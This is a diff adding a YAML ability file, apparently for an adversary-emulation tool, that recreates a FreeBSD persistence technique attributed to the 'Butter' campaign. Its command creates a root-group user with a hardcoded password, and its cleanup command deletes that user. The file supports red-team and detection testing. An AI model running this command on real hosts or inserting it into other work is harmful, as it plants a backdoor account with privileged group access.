@@ -1,0 +1,18 @@
+---
+- id: 2d21e5cb51c31b446f83e21b05e44be9
+  name: Create a new user in FreeBSD with `root` GID.
+  description: 'Creates a new user in FreeBSD and adds the user to the `root` group.
+    This technique was used by adversaries during the Butter attack campaign.
+
+    '
+  tactic: persistence
+  technique:
+    attack_id: T1136.001
+    name: 'Create Account: Local Account'
+  platforms:
+    linux:
+      sh:
+        command: pw useradd butter -g 0 -d /root -s /bin/sh; echo "BetterWithButter"
+          | pw usermod butter -h 0
+        payloads: []
+        cleanup: pw userdel butter
